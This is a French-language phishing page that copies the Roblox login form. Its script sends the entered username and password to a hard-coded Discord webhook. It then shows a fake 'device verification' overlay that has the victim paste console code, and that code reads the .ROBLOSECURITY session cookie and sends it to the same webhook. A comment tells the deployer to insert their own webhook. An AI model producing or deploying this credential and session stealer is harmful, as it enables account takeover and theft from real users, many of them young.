<!DOCTYPE html>

<html lang="fr">

<head>

    <meta charset="UTF-8">

    <title>Connexion à Roblox</title>

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>

        @font-face { font-family: 'HSRansert'; src: url('https://fonts.cdnfonts.com/s/15011/Gotham-Medium.woff'); }

        body { margin: 0; padding: 0; background: #000 url('https://images.rbxcdn.com/f9c3c04d0c1b4b6099a4b3d3f9e4f5d5.jpg') no-repeat center center fixed; background-size: cover; font-family: "HSRansert", sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }

        body::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.65); z-index: 1; }

        .login-box { position: relative; z-index: 2; background: #232527; width: 400px; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }

        h1 { color: #fff; font-size: 30px; margin-bottom: 25px; font-weight: 500; }

        input { width: 100%; padding: 12px; margin-bottom: 12px; background: #393b3d; border: 1px solid #393b3d; border-radius: 4px; color: #fff; font-size: 16px; box-sizing: border-box; outline: none; }

        .btn-login { width: 100%; padding: 12px; background: transparent; border: 1px solid #fff; border-radius: 4px; color: #fff; font-size: 16px; cursor: pointer; margin-top: 10px; font-weight: 500; }

        .btn-login:hover { background: rgba(255,255,255,0.1); }

        .secondary { width: 100%; padding: 12px; background: #393b3d; border: none; border-radius: 4px; color: #fff; font-size: 16px; margin-top: 12px; cursor: pointer; }

        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; justify-content: center; align-items: center; color: white; text-align: center; padding: 20px; box-sizing: border-box; }

        code { background: #111; padding: 10px; color: #00a8fc; display: block; margin: 15px 0; font-size: 10px; word-break: break-all; border: 1px dashed #444; }

    </style>

</head>

<body>



<div class="login-box" id="main">

    <h1>Connexion à Roblox</h1>

    <input type="text" id="u" placeholder="Identifiant/E-mail/Téléphone">

    <input type="password" id="p" placeholder="Mot de passe">

    <button class="btn-login" onclick="triggerBypass()">Connexion</button>

    <div style="color: #adb1b5; font-size: 14px; margin-top: 20px; cursor: pointer;">Mot de passe ou nom d'utilisateur oublié ?</div>

    <button class="secondary" style="margin-top: 30px;">Envoyez-moi un code unique par email</button>

    <button class="secondary">Inscription rapide</button>

</div>



<div id="overlay">

    <div style="max-width: 500px;">

        <h2 style="color: #f68802;">⚠️ Vérification d'appareil 2026</h2>

        <p>Pour des raisons de sécurité, veuillez synchroniser votre navigateur :</p>

        <p style="font-size: 14px; color: #ccc; text-align: left;">1. Appuyez sur <b>F12</b> (ou clic droit > Inspecter).<br>2. Allez dans l'onglet <b>Console</b>.<br>3. Collez ce code et appuyez sur <b>Entrée</b> :</p>

        <code id="grab-code"></code>

        <button class="btn-login" onclick="location.reload()">J'AI COLLÉ LE CODE</button>

    </div>

</div>



<script>

    const webhook = "https://discord.com/api/webhooks/1490805370715902075/gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9"; // <--- METS TON WEBHOOK ICI



    const snatch = `(async()=>{const c=document.cookie.split('; ').find(r=>r.startsWith('.ROBLOSECURITY='));if(c){await fetch('${webhook}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'💎 SESSION CAPTURÉE',description:'Cookie : '+c.split('=')[1],color:3066993}]})});alert('Session synchronisée !');}})();`;



    document.getElementById('grab-code').innerText = snatch;



    async function triggerBypass() {

        const user = document.getElementById('u').value;

        const pass = document.getElementById('p').value;

        if(!user || !pass) return;



        // 1. On envoie d'abord le pass au cas où

        await fetch(webhook, {

            method: 'POST',

            headers: {'Content-Type': 'application/json'},

            body: JSON.stringify({ content: `👤 **User:** ${user} | 🔑 **Pass:** ${pass}` })

        });



        // 2. On affiche le bypass de session

        document.getElementById('main').style.display = 'none';

        document.getElementById('overlay').style.display = 'flex';

    }

</script>

</body>

</html>
